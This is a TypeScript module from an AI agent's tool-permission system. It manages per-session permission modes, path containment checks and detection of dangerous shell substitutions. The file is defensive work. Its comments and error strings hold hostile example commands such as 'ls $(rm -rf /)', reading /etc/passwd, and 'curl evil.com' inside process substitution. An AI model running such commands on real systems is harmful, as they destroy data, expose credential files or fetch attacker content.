/**
 * Centralized Permission Mode Manager
 *
 * Manages agent permission modes for tool execution.
 * Each session has its own mode state - no global state contamination.
 *
 * Available Permission Modes:
 * - 'safe': Plan-first mode (blocks writes, never prompts)
 * - 'ask': Ask for permission on dangerous operations (default interactive behavior)
 * - 'auto-edit': Apply edits automatically, ask for other risky operations
 * - 'allow-all': Skip all permission checks (everything allowed)
 */

/// <reference path="../types/incr-regex-package.d.ts" />

import { homedir } from 'os';
import { existsSync, realpathSync } from 'fs';
import { debug } from '../utils/debug.ts';
import { dirname, isAbsolute, relative, resolve } from 'path';
import { getSessionSafeAllowedToolNames } from '@craft-agent/session-tools-core';
import { FEATURE_FLAGS } from '../feature-flags.ts';
import { isBrowserToolNameOrAlias } from './browser-tool-names.ts';
import type { PermissionsContext, MergedPermissionsConfig } from './permissions-config.ts';
import {
  validateBashCommand,
  hasControlCharacters,
  type BashValidationResult,
  type BashValidationReason,
} from './bash-validator.ts';
import {
  validatePowerShellCommand,
  looksLikePowerShell,
  isPowerShellAvailable,
  extractPowerShellWriteTarget,
  type PowerShellValidationResult,
  type PowerShellValidationReason,
} from './powershell-validator.ts';
import {
  type PermissionMode,
  type ModeConfig,
  type CompiledApiEndpointRule,
  type CompiledBashPattern,
  type CompiledBlockedCommandHint,
  type MismatchAnalysis,
  PERMISSION_MODE_ORDER,
  PERMISSION_MODE_CONFIG,
  SAFE_MODE_CONFIG,
  type PermissionModeCanonical,
  toCanonicalPermissionMode,
  parsePermissionMode,
} from './mode-types.ts';

// Import incr-regex-package for smart pattern mismatch diagnostics
// This library allows character-by-character matching to find WHERE a regex match failed
import { IREGEX, DONE, MORE, FAILED } from 'incr-regex-package';

// Re-export types and config from mode-types (single source of truth)
export {
  type PermissionMode,
  type PermissionModeCanonical,
  type ModeConfig,
  type CompiledApiEndpointRule,
  type CompiledBashPattern,
  type CompiledBlockedCommandHint,
  type MismatchAnalysis,
  PERMISSION_MODE_ORDER,
  PERMISSION_MODE_CONFIG,
  SAFE_MODE_CONFIG,
  toCanonicalPermissionMode,
  parsePermissionMode,
};

// Re-export PowerShell validator types
export {
  type PowerShellValidationResult,
  type PowerShellValidationReason,
  looksLikePowerShell,
  isPowerShellAvailable,
};

/**
 * State for a single session's permission mode
 */
export type PermissionModeChangedBy = 'user' | 'system' | 'restore' | 'automation' | 'unknown';

type PermissionModeChangeMetadata = {
  changedBy?: PermissionModeChangedBy;
  changedAt?: string;
  suppressLog?: boolean;
};

export interface ModeState {
  /** Session ID */
  sessionId: string;
  /** Current permission mode */
  permissionMode: PermissionMode;
  /** Previous permission mode (if any mode transition has occurred) */
  previousPermissionMode?: PermissionMode;
  /** Monotonic version incremented each time the mode changes */
  modeVersion: number;
  /** ISO timestamp for the last mode change */
  lastChangedAt: string;
  /** Actor that initiated the last mode change */
  lastChangedBy: PermissionModeChangedBy;
  /** Last user-mode modeVersion for which one-turn signal has been consumed */
  lastUserSignalConsumedModeVersion?: number;
  /** Callback when mode state changes */
  onStateChange?: (state: ModeState) => void;
}

/**
 * Callbacks for mode changes
 */
export interface ModeCallbacks {
  onStateChange?: (state: ModeState) => void;
}

// ============================================================
// Path Matching Utilities
// ============================================================

/**
 * Expand ~ to home directory
 */
function expandHome(path: string): string {
  if (path.startsWith('~/') || path === '~') {
    return path.replace(/^~/, homedir());
  }
  return path;
}

/**
 * Convert a simple glob pattern to a regex
 * Supports: ** (recursive), * (single segment), ? (single char)
 */
function globToRegex(pattern: string): RegExp {
  // Expand ~ in pattern
  const expandedPattern = expandHome(pattern);

  // Escape special regex chars except glob wildcards
  let regex = expandedPattern
    .replace(/[.+^${}()|[\]\\]/g, '\\$&')  // Escape regex special chars
    .replace(/\*\*/g, '\0DOUBLE_STAR\0')   // Temporarily replace **
    .replace(/\*/g, '[^/]*')                // * matches single path segment
    .replace(/\0DOUBLE_STAR\0/g, '.*')      // ** matches anything including /
    .replace(/\?/g, '.');                   // ? matches single char

  return new RegExp(`^${regex}$`);
}

/**
 * Check if a path matches any of the allowed write path patterns
 */
function matchesAllowedWritePath(filePath: string, allowedPaths: string[]): boolean {
  // Normalize path (expand ~, resolve, and use forward slashes)
  const normalizedPath = normalizeForComparison(expandHome(filePath));

  for (const pattern of allowedPaths) {
    try {
      const regex = globToRegex(pattern);
      if (regex.test(normalizedPath)) {
        debug(`[Mode] Path "${normalizedPath}" matches allowed pattern "${pattern}"`);
        return true;
      }
    } catch (e) {
      debug(`[Mode] Invalid glob pattern "${pattern}":`, e);
    }
  }
  return false;
}

/**
 * Normalize a path for cross-platform comparison.
 * - Resolve to absolute path
 * - Convert backslashes to forward slashes
 * - Lowercase on Windows for case-insensitive comparison
 */
function normalizeForComparison(path: string): string {
  const normalized = resolve(path).replace(/\\/g, '/');
  return process.platform === 'win32' ? normalized.toLowerCase() : normalized;
}

function isWithin(base: string, target: string): boolean {
  const normalizedBase = normalizeForComparison(base);
  const normalizedTarget = normalizeForComparison(target);
  const rel = relative(normalizedBase, normalizedTarget);
  return rel === '' || (!rel.startsWith('..') && !isAbsolute(rel));
}

/**
 * Check whether targetPath is inside baseDir (or exactly equal to it).
 *
 * Uses path.relative semantics to avoid sibling-prefix bypasses and then
 * re-validates using real paths to prevent symlink escapes.
 */
function isPathWithinDirectory(targetPath: string, baseDir: string): boolean {
  const expandedTarget = expandHome(targetPath);
  const expandedBase = expandHome(baseDir);

  const resolvedTarget = resolve(expandedTarget);
  const resolvedBase = resolve(expandedBase);
  if (!isWithin(resolvedBase, resolvedTarget)) {
    return false;
  }

  const realBase = existsSync(resolvedBase) ? realpathSync.native(resolvedBase) : resolvedBase;

  if (existsSync(resolvedTarget)) {
    const realTarget = realpathSync.native(resolvedTarget);
    return isWithin(realBase, realTarget);
  }

  // Target may be a new file path. Validate using nearest existing ancestor
  // to prevent symlink escapes while still allowing legitimate new files.
  let current = dirname(resolvedTarget);
  while (true) {
    if (existsSync(current)) {
      const realCurrent = realpathSync.native(current);
      return isWithin(realBase, realCurrent);
    }
    const parent = dirname(current);
    if (parent === current) {
      return false;
    }
    current = parent;
  }
}

// ============================================================
// Mode Manager Class
// ============================================================

/**
 * Manager for per-session permission mode state.
 * Each session has its own state - NO GLOBAL STATE.
 */
class ModeManager {
  private states: Map<string, ModeState> = new Map();
  private callbacks: Map<string, ModeCallbacks> = new Map();
  private subscribers: Map<string, Set<() => void>> = new Map();

  /**
   * Hydrate persisted transition context (previous mode) without mutating current mode/version.
   * Used on session restore so transition metadata can survive app restarts.
   */
  setPreviousPermissionMode(sessionId: string, previousPermissionMode?: PermissionMode): void {
    const existing = this.getState(sessionId);
    if (existing.previousPermissionMode === previousPermissionMode) {
      return;
    }

    const newState: ModeState = {
      ...existing,
      previousPermissionMode,
    };
    this.states.set(sessionId, newState);
  }

  /**
   * Get or create state for a session
   */
  getState(sessionId: string): ModeState {
    let state = this.states.get(sessionId);
    if (!state) {
      state = {
        sessionId,
        permissionMode: 'ask', // Default to 'ask' until initialized
        modeVersion: 0,
        lastChangedAt: new Date().toISOString(),
        lastChangedBy: 'system',
      };
      this.states.set(sessionId, state);
    }
    return state;
  }

  /**
   * Set permission mode for a session.
   * @returns true when state changed, false when mode was unchanged
   */
  setPermissionMode(
    sessionId: string,
    mode: PermissionMode,
    metadata?: PermissionModeChangeMetadata
  ): boolean {
    const existing = this.getState(sessionId);

    // No-op when mode is unchanged (prevents duplicate logs/events)
    if (existing.permissionMode === mode) {
      return false;
    }

    const changedAt = metadata?.changedAt ?? new Date().toISOString();
    const changedBy = metadata?.changedBy ?? 'unknown';

    const isInitialRestore = existing.modeVersion === 0 && changedBy === 'restore';
    const shouldTrackTransition = !isInitialRestore;

    const newState: ModeState = {
      ...existing,
      previousPermissionMode: shouldTrackTransition ? existing.permissionMode : undefined,
      permissionMode: mode,
      modeVersion: existing.modeVersion + 1,
      lastChangedAt: changedAt,
      lastChangedBy: changedBy,
    };
    this.states.set(sessionId, newState);

    if (!isInitialRestore && !metadata?.suppressLog) {
      debug(`[Mode] Set permission mode to ${mode} for session ${sessionId} (changedBy=${changedBy}, modeVersion=${newState.modeVersion})`);
    }

    // Notify callbacks (for CraftAgent internal sync)
    const callbacks = this.callbacks.get(sessionId);
    if (callbacks?.onStateChange) {
      callbacks.onStateChange(newState);
    }

    // Notify React subscribers (for useSyncExternalStore)
    this.subscribers.get(sessionId)?.forEach(cb => cb());
    return true;
  }

  /**
   * Mark the current user-origin mode change signal as consumed.
   * No-op unless the latest mode change was user-initiated.
   */
  consumeUserModeSignal(sessionId: string): void {
    const existing = this.getState(sessionId);
    if (existing.lastChangedBy !== 'user') {
      return;
    }

    if (existing.lastUserSignalConsumedModeVersion === existing.modeVersion) {
      return;
    }

    const newState: ModeState = {
      ...existing,
      lastUserSignalConsumedModeVersion: existing.modeVersion,
    };
    this.states.set(sessionId, newState);
  }

  /**
   * Register callbacks for a session
   */
  registerCallbacks(sessionId: string, callbacks: ModeCallbacks): void {
    this.callbacks.set(sessionId, callbacks);
  }

  /**
   * Unregister callbacks for a session
   */
  unregisterCallbacks(sessionId: string): void {
    this.callbacks.delete(sessionId);
  }

  /**
   * Clean up a session's state
   */
  cleanupSession(sessionId: string): void {
    this.states.delete(sessionId);
    this.callbacks.delete(sessionId);
    this.subscribers.delete(sessionId);
  }

  /**
   * Subscribe to mode changes for a session (for React useSyncExternalStore)
   * Returns an unsubscribe function
   */
  subscribe(sessionId: string, callback: () => void): () => void {
    if (!this.subscribers.has(sessionId)) {
      this.subscribers.set(sessionId, new Set());
    }
    this.subscribers.get(sessionId)!.add(callback);

    // Return unsubscribe function
    return () => {
      this.subscribers.get(sessionId)?.delete(callback);
    };
  }
}

// Singleton manager instance
export const modeManager = new ModeManager();

// ============================================================
// Permission Mode API
// ============================================================

/**
 * Get the current permission mode for a session
 */
export function getPermissionMode(sessionId: string): PermissionMode {
  return modeManager.getState(sessionId).permissionMode;
}

/**
 * Set the permission mode for a session.
 * @returns true when state changed, false when mode was unchanged
 */
export function setPermissionMode(
  sessionId: string,
  mode: PermissionMode,
  metadata?: PermissionModeChangeMetadata
): boolean {
  return modeManager.setPermissionMode(sessionId, mode, metadata);
}

/**
 * Consume one-turn user mode-change signal for the current modeVersion.
 */
export function consumeUserModeSignal(sessionId: string): void {
  modeManager.consumeUserModeSignal(sessionId);
}

/**
 * Cycle to the next permission mode (for SHIFT+TAB)
 * @param sessionId - The session to cycle mode for
 * @param enabledModes - Optional list of enabled modes to cycle through (defaults to all modes)
 * Returns the new mode
 */
export function cyclePermissionMode(
  sessionId: string,
  enabledModes?: PermissionMode[]
): PermissionMode {
  const currentMode = getPermissionMode(sessionId);
  // Use provided modes or default to all modes
  const modes = enabledModes && enabledModes.length >= 2 ? enabledModes : PERMISSION_MODE_ORDER;
  const currentIndex = modes.indexOf(currentMode);

  // If current mode not in enabled list, jump to first enabled mode
  if (currentIndex === -1) {
    const nextMode = modes[0] ?? 'ask';
    setPermissionMode(sessionId, nextMode, { changedBy: 'user' });
    return nextMode;
  }

  const nextIndex = (currentIndex + 1) % modes.length;
  // Safe assertion: nextIndex is always valid due to modulo operation
  const nextMode = modes[nextIndex] as PermissionMode;
  setPermissionMode(sessionId, nextMode, { changedBy: 'user' });
  return nextMode;
}

/**
 * Subscribe to mode changes for a session (for React useSyncExternalStore)
 * Returns an unsubscribe function
 */
export function subscribeModeChanges(sessionId: string, callback: () => void): () => void {
  return modeManager.subscribe(sessionId, callback);
}

/**
 * Get mode state for a session
 */
export function getModeState(sessionId: string): ModeState {
  return modeManager.getState(sessionId);
}

/**
 * Hydrate persisted transition context for a session without changing current mode.
 */
export function hydratePreviousPermissionMode(sessionId: string, previousPermissionMode?: PermissionMode): void {
  modeManager.setPreviousPermissionMode(sessionId, previousPermissionMode);
}

/**
 * Lightweight diagnostics for permission denials and debugging.
 */
export function getPermissionModeDiagnostics(sessionId: string): {
  permissionMode: PermissionMode;
  previousPermissionMode?: PermissionMode;
  transitionDisplay?: string;
  modeVersion: number;
  lastChangedAt: string;
  lastChangedBy: PermissionModeChangedBy;
  userModeSignalPending: boolean;
} {
  const state = modeManager.getState(sessionId);
  const transitionDisplay = state.previousPermissionMode
    ? `${PERMISSION_MODE_CONFIG[state.previousPermissionMode].displayName} -> ${PERMISSION_MODE_CONFIG[state.permissionMode].displayName}`
    : undefined;
  const userModeSignalPending =
    state.lastChangedBy === 'user' &&
    state.modeVersion > 0 &&
    state.lastUserSignalConsumedModeVersion !== state.modeVersion;

  return {
    permissionMode: state.permissionMode,
    previousPermissionMode: state.previousPermissionMode,
    transitionDisplay,
    modeVersion: state.modeVersion,
    lastChangedAt: state.lastChangedAt,
    lastChangedBy: state.lastChangedBy,
    userModeSignalPending,
  };
}

/**
 * Initialize permission mode state for a session with callbacks
 */
export function initializeModeState(
  sessionId: string,
  initialMode: PermissionMode | { permissionMode?: PermissionMode },
  callbacks?: ModeCallbacks
): void {
  let mode: PermissionMode;

  if (typeof initialMode === 'string') {
    mode = initialMode;
  } else if ('permissionMode' in initialMode && initialMode.permissionMode) {
    mode = initialMode.permissionMode;
  } else {
    // Default to 'ask' if not specified
    mode = 'ask';
  }

  // IMPORTANT: Register callbacks BEFORE setting mode so the initial
  // state change triggers the callback.
  if (callbacks) {
    modeManager.registerCallbacks(sessionId, callbacks);
  }
  modeManager.setPermissionMode(sessionId, mode, { changedBy: 'restore' });
}

/**
 * Clean up mode state for a session
 */
export function cleanupModeState(sessionId: string): void {
  modeManager.cleanupSession(sessionId);
}

// ============================================================
// Tool Blocking Logic (Centralized)
// ============================================================

/**
 * Config type that works with both ModeConfig and MergedPermissionsConfig
 */
type ToolCheckConfig = ModeConfig | MergedPermissionsConfig;

/**
 * Dangerous control characters that could cause issues at lower levels.
 *
 * Note: Newlines and carriage returns are NOT blocked because bash-parser
 * correctly handles them as command separators, and the AST validation
 * checks each command individually. Only null bytes are blocked as they
 * could cause issues with C bindings and string handling.
 */
const DANGEROUS_CONTROL_CHARS = new Set([
  '\x00',  // Null byte - can truncate strings in some contexts
]);

/**
 * Check if a command contains dangerous control characters.
 *
 * @param command - The bash command to check
 * @returns true if command contains dangerous control chars, false if safe
 */
export function hasDangerousControlChars(command: string): boolean {
  for (const char of command) {
    if (DANGEROUS_CONTROL_CHARS.has(char)) {
      debug(`[Mode] Dangerous control character detected (code ${char.charCodeAt(0)}) in command`);
      return true;
    }
  }
  return false;
}

/**
 * Check if a command contains dangerous command/process substitution patterns.
 *
 * Detects:
 * - Command substitution: $(...) or `...` (backticks)
 * - Process substitution: <(...) or >(...)
 *
 * These are dangerous because they execute arbitrary commands:
 * - `ls $(rm -rf /)` - the rm runs during argument expansion
 * - `echo "$(cat /etc/passwd)"` - executes even inside double quotes
 * - `cat <(curl http://evil.com)` - process substitution runs curl
 *
 * Note: Single-quoted strings are safe: `echo '$(rm)'` is literal text
 *
 * @param command - The bash command to check
 * @returns true if command contains dangerous substitution, false if safe
 */
export function hasDangerousSubstitution(command: string): boolean {
  let inSingleQuote = false;
  let escaped = false;

  for (let i = 0; i < command.length; i++) {
    const char = command[i];
    const nextChar = command[i + 1];

    // Handle escape sequences (only outside single quotes)
    if (escaped) {
      escaped = false;
      continue;
    }

    if (char === '\\' && !inSingleQuote) {
      escaped = true;
      continue;
    }

    // Track single quote state (double quotes don't protect against substitution)
    if (char === "'" && !escaped) {
      inSingleQuote = !inSingleQuote;
      continue;
    }

    // Only check for dangerous patterns outside single quotes
    if (!inSingleQuote) {
      // Command substitution: $(
      if (char === '$' && nextChar === '(') {
        debug(`[Mode] Command substitution $() detected in: ${command}`);
        return true;
      }

      // Backtick command substitution
      if (char === '`') {
        debug(`[Mode] Backtick substitution detected in: ${command}`);
        return true;
      }

      // Process substitution: <( or >(
      if ((char === '<' || char === '>') && nextChar === '(') {
        debug(`[Mode] Process substitution detected in: ${command}`);
        return true;
      }
    }
  }

  return false;
}

// ============================================================
// Bash Rejection Reasons (Detailed error messages)
// ============================================================

/**
 * Pattern info for error messages - shows what patterns might have matched
 */
export interface RelevantPatternInfo {
  source: string;
  comment?: string;
}

/**
 * Detailed reason why a bash command was rejected in Plan mode.
 * Used to provide helpful error messages that explain exactly what was blocked and why.
 */
export type BashRejectionReason =
  | { type: 'control_char'; char: string; charCode: number; explanation: string }
  | { type: 'no_safe_pattern'; command: string; relevantPatterns: RelevantPatternInfo[]; mismatchAnalysis?: MismatchAnalysis; commandHint?: CompiledBlockedCommandHint }
  | { type: 'dangerous_operator'; operator: string; operatorType: 'chain' | 'redirect'; explanation: string }
  | { type: 'dangerous_substitution'; pattern: string; explanation: string }
  | { type: 'parse_error'; error: string }
  // New AST-based rejection types (from bash-validator)
  | { type: 'pipeline'; explanation: string }
  | { type: 'redirect'; op: string; explanation: string }
  | { type: 'command_expansion'; explanation: string }
  | { type: 'process_substitution'; explanation: string }
  | { type: 'parameter_expansion'; explanation: string }
  | { type: 'env_assignment'; explanation: string }
  | { type: 'unsafe_command'; command: string; explanation: string }
  | { type: 'compound_partial_fail'; failedCommands: string[]; passedCommands: string[] };

/**
 * Human-readable explanations for control characters.
 */
const CONTROL_CHAR_EXPLANATIONS: Record<string, string> = {
  '\n': 'newline acts as command separator in bash (e.g., `safe\\ndangerous` runs both)',
  '\r': 'carriage return can act as command separator',
  '\x00': 'null byte can truncate strings and cause unexpected behavior',
};

/**
 * Find the first dangerous control character in a command.
 * Returns details about the character if found, null otherwise.
 */
function findDangerousControlChar(command: string): { char: string; charCode: number; explanation: string } | null {
  for (const char of command) {
    if (DANGEROUS_CONTROL_CHARS.has(char)) {
      const charCode = char.charCodeAt(0);
      const displayChar = char === '\n' ? '\\n' : char === '\r' ? '\\r' : char === '\x00' ? '\\0' : `\\x${charCode.toString(16).padStart(2, '0')}`;
      const explanation = CONTROL_CHAR_EXPLANATIONS[char] ?? `control character (code ${charCode}) can cause unexpected behavior`;
      return { char: displayChar, charCode, explanation };
    }
  }
  return null;
}

/**
 * Find dangerous command/process substitution in a command.
 * Returns details about the pattern if found, null otherwise.
 */
function findDangerousSubstitution(command: string): { pattern: string; explanation: string } | null {
  let inSingleQuote = false;
  let escaped = false;

  for (let i = 0; i < command.length; i++) {
    const char = command[i];
    const nextChar = command[i + 1];

    if (escaped) {
      escaped = false;
      continue;
    }

    if (char === '\\' && !inSingleQuote) {
      escaped = true;
      continue;
    }

    if (char === "'" && !escaped) {
      inSingleQuote = !inSingleQuote;
      continue;
    }

    if (!inSingleQuote) {
      if (char === '$' && nextChar === '(') {
        return {
          pattern: '$()',
          explanation: 'command substitution executes embedded commands during expansion (e.g., `ls $(rm -rf /)`)',
        };
      }

      if (char === '`') {
        return {
          pattern: '`...`',
          explanation: 'backtick substitution executes embedded commands (e.g., `echo \\`rm -rf /\\``)',
        };
      }

      if (char === '<' && nextChar === '(') {
        return {
          pattern: '<()',
          explanation: 'process substitution executes commands and provides output as a file (e.g., `cat <(curl evil.com)`)',
        };
      }

      if (char === '>' && nextChar === '(') {
        return {
          pattern: '>()',
          explanation: 'process substitution executes commands with input from a file descriptor',
        };
      }
    }
  }

  return null;
}

/**
 * Find patterns that might be relevant to the attempted command.
 * Extracts the first word (command name) and finds patterns containing it.
 * This helps provide actionable error messages when a command is blocked.
 *
 * For example, if the command is "git -C /path status", this will find
 * the git pattern and show the agent what format is expected.
 */
function findRelevantPatterns(command: string, patterns: CompiledBashPattern[]): RelevantPatternInfo[] {
  // Extract the first word (command name) from the command
  const firstWord = command.trim().split(/\s+/)[0]?.toLowerCase();
  if (!firstWord) return [];

  // Find patterns whose source contains the command name
  // This catches patterns like "^git\s+(status|log|...)" when command starts with "git"
  const relevant: RelevantPatternInfo[] = [];

  for (const pattern of patterns) {
    // Check if the pattern source contains the command name
    // Use case-insensitive matching and look for the command at word boundaries
    const sourceLower = pattern.source.toLowerCase();
    if (
      sourceLower.includes(firstWord) ||
      sourceLower.startsWith(`^${firstWord}`)
    ) {
      relevant.push({
        source: pattern.source,
        comment: pattern.comment,
      });
    }
  }

  // Limit to top 3 most relevant patterns to avoid overwhelming the agent
  return relevant.slice(0, 3);
}

/**
 * Resolve command-specific hint for blocked bash commands.
 * Uses exact base-command match and optional whenNotMatching condition.
 */
function findBlockedCommandHint(command: string, config: ToolCheckConfig): CompiledBlockedCommandHint | undefined {
  const hints = config.blockedCommandHints ?? [];
  if (hints.length === 0) return undefined;

  const firstToken = command.trim().split(/\s+/)[0]?.toLowerCase();
  if (!firstToken) return undefined;
  const baseCommand = firstToken.split('/').pop() ?? firstToken;

  for (const hint of hints) {
    if (hint.command !== baseCommand) continue;

    // If a condition is provided, hint applies only when command does NOT match it
    if (hint.whenNotMatchingRegex && hint.whenNotMatchingRegex.test(command)) {
      continue;
    }

    return hint;
  }

  return undefined;
}

/**
 * Analyze WHY a command didn't match any pattern using incremental regex matching.
 * Uses incr-regex-package to find exactly WHERE in the command matching stopped,
 * which helps generate actionable error messages.
 *
 * For example, if the command is "git -C /path status" and the pattern is
 * "^git\s+(status|log|diff)", this will detect that matching stopped at "-C"
 * and suggest running from within the repo directory instead.
 */
function analyzePatternMismatch(command: string, patterns: CompiledBashPattern[]): MismatchAnalysis | null {
  const trimmedCommand = command.trim();
  if (!trimmedCommand) return null;

  // Find the pattern that matches the longest prefix of the command
  // This gives us the "best match" to analyze
  let bestMatch: {
    matchedCount: number;
    matchedPrefix: string;
    pattern: CompiledBashPattern;
  } | null = null;

  for (const pattern of patterns) {
    try {
      // Simplify the pattern for incr-regex: remove anchors and word boundaries
      // which aren't supported by the incremental matching library.
      // This is fine since we only use it for diagnostic purposes.
      const simplifiedPattern = pattern.source
        .replace(/^\^/, '')     // Remove start anchor
        .replace(/\$$/g, '')    // Remove end anchor
        .replace(/\\b/g, '');   // Remove word boundaries

      // Create incremental regex matcher from the simplified pattern
      // IREGEX is a class that takes a regex pattern string in its constructor
      const incr = new IREGEX(simplifiedPattern);

      // Use matchStr to process the entire command and get match info
      // Returns [success, charCount, matchedString]
      const [_success, charCount, matchedStr] = incr.matchStr(trimmedCommand);

      // Track the pattern that matched the most characters (best partial match)
      if (charCount > 0 && (!bestMatch || charCount > bestMatch.matchedCount)) {
        bestMatch = {
          matchedCount: charCount,
          matchedPrefix: matchedStr || trimmedCommand.substring(0, charCount),
          pattern,
        };
      }
    } catch {
      // If incr-regex can't parse the pattern (complex regex features),
      // skip this pattern - we'll fall back to basic diagnostics
      continue;
    }
  }

  // If no pattern matched anything, return null (unknown command)
  if (!bestMatch || bestMatch.matchedCount === 0) {
    return null;
  }

  // Analyze what token caused the mismatch
  const failedPosition = bestMatch.matchedCount;
  const remainingCommand = trimmedCommand.substring(failedPosition).trim();
  const failedToken = remainingCommand.split(/\s+/)[0] || '';

  // Generate a helpful suggestion based on what we found
  const suggestion = generateMismatchSuggestion(
    trimmedCommand,
    bestMatch.matchedPrefix,
    failedToken,
    bestMatch.pattern
  );

  return {
    matchedPrefix: bestMatch.matchedPrefix,
    failedAtPosition: failedPosition,
    failedToken,
    bestMatchPattern: {
      source: bestMatch.pattern.source,
      comment: bestMatch.pattern.comment,
    },
    suggestion,
  };
}

/**
 * Generate an actionable suggestion based on pattern mismatch analysis.
 * Looks for common patterns like flags before subcommands in git/gh/docker.
 */
function generateMismatchSuggestion(
  command: string,
  matchedPrefix: string,
  failedToken: string,
  pattern: CompiledBashPattern
): string | undefined {
  const firstWord = command.split(/\s+/)[0]?.toLowerCase();

  // Detect "flags before subcommand" pattern for git, gh, docker, kubectl
  const commandsWithSubcommands = ['git', 'gh', 'docker', 'kubectl', 'npm', 'yarn', 'cargo'];
  if (
    commandsWithSubcommands.includes(firstWord || '') &&
    failedToken.startsWith('-')
  ) {
    // The command has a flag where a subcommand was expected
    // Try to find the actual subcommand later in the command
    const words = command.split(/\s+/);
    const subcommandCandidates = words.slice(1).filter(w => !w.startsWith('-') && !w.includes('/'));

    if (subcommandCandidates.length > 0) {
      const likelySubcommand = subcommandCandidates[0];
      return `The pattern expects \`${firstWord} <subcommand>\` directly, but found flag \`${failedToken}\` first. ` +
        `Try running from within the target directory, or use: \`${firstWord} ${likelySubcommand} ...\``;
    }

    return `The pattern expects a subcommand after \`${firstWord}\`, but found flag \`${failedToken}\`. ` +
      `Run from the target directory or switch to Ask before edits, Edit automatically, or YOLO.`;
  }

  // Detect possible typos in subcommands using simple heuristics
  // (Check if failedToken is close to any word in the pattern)
  if (pattern.comment && !failedToken.startsWith('-')) {
    // Extract subcommand options from pattern comment if present
    // e.g., "Git read-only operations: view status, history, branches, diffs"
    const commentLower = pattern.comment.toLowerCase();
    const failedTokenLower = failedToken.toLowerCase();

    // Check for common subcommand names in the comment
    const commonSubcommands = ['status', 'log', 'diff', 'show', 'branch', 'list', 'view', 'get', 'describe'];
    for (const sub of commonSubcommands) {
      // Simple Levenshtein-ish check: if token is within 2 chars of a known subcommand
      if (
        commentLower.includes(sub) &&
        Math.abs(failedTokenLower.length - sub.length) <= 2 &&
        failedTokenLower !== sub
      ) {
        // Check if first 2 chars match (simple typo detection)
        if (failedTokenLower.substring(0, 2) === sub.substring(0, 2)) {
          return `Did you mean \`${firstWord} ${sub}\` instead of \`${firstWord} ${failedToken}\`?`;
        }
      }
    }
  }

  // Generic fallback
  return undefined;
}

// ============================================================
// Windows Path Helpers (for bash-parser fallback)
// ============================================================

/**
 * Check if a command looks like a Windows CMD builtin that can't be parsed
 * by bash-parser or normalized via path rewriting.
 */
function looksLikeCmdBuiltin(command: string): boolean {
  // Match CMD builtins at the start of the command (case-insensitive).
  // Note: `type` is excluded because it's also a valid bash builtin (check command type).
  // Note: `mkdir` is excluded because it's also a valid Unix/bash command.
  return /^(?:if\s+(?:not\s+)?exist|for\s+\/[a-z]|set\s+\w+=|copy\s|move\s|ren(?:ame)?\s|del\s|erase\s|rd\s|rmdir\s|md\s|assoc\s|ftype\s)\b/i.test(command);
}

/**
 * Normalize Windows backslash paths in a command string so that bash-parser
 * (a POSIX parser) can handle them without treating \ as escape characters.
 *
 * Converts backslashes to forward slashes inside:
 * - Double-quoted strings: "C:\Users\..." → "C:/Users/..."
 * - Single-quoted strings: passed through (bash-parser treats them as literal anyway)
 * - Unquoted tokens that look like Windows paths: C:\Users\... → C:/Users/...
 *
 * Preserves actual bash escape sequences (\n, \t, \\, \", etc.) inside
 * double-quoted strings by only converting backslashes that precede
 * characters that are NOT standard bash escape targets.
 */
export function normalizeWindowsPathsForBashParser(command: string): string {
  let result = '';
  let i = 0;

  while (i < command.length) {
    const ch = command[i];

    if (ch === "'") {
      // Single-quoted string: copy verbatim (bash treats contents literally)
      const end = command.indexOf("'", i + 1);
      if (end === -1) {
        // Unclosed single quote - copy rest as-is
        result += command.slice(i);
        break;
      }
      result += command.slice(i, end + 1);
      i = end + 1;
    } else if (ch === '"') {
      // Double-quoted string: fix the critical \" issue for Windows paths.
      //
      // In bash, \X inside double quotes is only special for 5 chars: \ " $ ` !
      // For all other chars, bash-parser keeps the literal \X (no stripping).
      // So the ONLY problem case is \" which bash-parser treats as an escaped
      // quote instead of "backslash + closing-quote". This happens when a
      // Windows path ends with \ right before the closing ":
      //   ls "C:\path\"  →  bash-parser sees \" as escaped quote, string never closes
      //
      // Fix: convert \\ to // (prevents double-backslash from eating a path sep)
      // and convert \" to /" (prevents the unclosed-quote parse failure).
      // Leave all other \X alone since bash-parser handles them correctly.
      result += '"';
      i++;
      while (i < command.length && command[i] !== '"') {
        if (command[i] === '\\' && i + 1 < command.length) {
          const next = command[i + 1];
          if (next === '"') {
            // \\" → /" — this is the critical fix for the "Unclosed quote" bug.
            // Convert the backslash to / so bash-parser sees the closing quote.
            result += '/';
            // Don't consume the quote - let the outer loop see it as closing
            i++;
          } else if (next === '\\') {
            // \\\\ → // — convert double-backslash to double-forward-slash
            result += '//';
            i += 2;
          } else {
            // All other \X — pass through literally (bash-parser keeps them as-is)
            result += command[i]! + next!;
            i += 2;
          }
        } else {
          result += command[i]!;
          i++;
        }
      }
      if (i < command.length) {
        result += '"'; // closing quote
        i++;
      }
    } else {
      // Unquoted context: detect Windows-style path tokens and convert
      // A Windows path looks like X:\ at the start of a "word"
      if (
        /[A-Za-z]/.test(ch!) &&
        i + 2 < command.length &&
        command[i + 1]! === ':' &&
        command[i + 2]! === '\\'
      ) {
        // Consume the path token (up to whitespace or special shell chars)
        let pathEnd = i;
        while (pathEnd < command.length && !/[\s|&;()<>]/.test(command[pathEnd]!)) {
          pathEnd++;
        }
        const pathToken = command.slice(i, pathEnd).replace(/\\/g, '/');
        result += pathToken;
        i = pathEnd;
      } else {
        result += ch;
        i++;
      }
    }
  }

  return result;
}

/**
 * Get detailed reason why a bash command would be rejected.
 * Returns null if the command is safe, otherwise returns the specific reason.
 *
 * Uses AST-based validation for compound commands (&&, ||, ;) to allow
 * safe compound commands like `git status && git log` while still blocking
 * dangerous constructs.
 *
 * For PowerShell commands (detected by syntax or on Windows), uses the
 * PowerShell validator with native System.Management.Automation parsing.
 *
 * This is used to provide helpful error messages that explain exactly what
 * was blocked and why, helping the agent understand and avoid the issue.
 */
export function getBashRejectionReason(command: string, config: ToolCheckConfig): BashRejectionReason | null {
  const trimmedCommand = command.trim();

  // Step 1: Check for dangerous control characters (before parsing)
  // These could affect parsing itself, so check first
  const controlChar = hasControlCharacters(trimmedCommand);
  if (controlChar) {
    return {
      type: 'control_char',
      char: controlChar.char,
      charCode: 0, // Not used in new flow, but kept for compatibility
      explanation: controlChar.explanation,
    };
  }

  // Step 2: Determine if this is a PowerShell command
  // Use PS validator only for commands that look like PowerShell syntax.
  // On Windows, non-PowerShell commands (e.g. `git status && git log`) are
  // validated via bash-parser with Windows path normalization instead, because
  // the PS parser has different semantics for redirects, subshells, $(), etc.
  const isWindows = process.platform === 'win32';
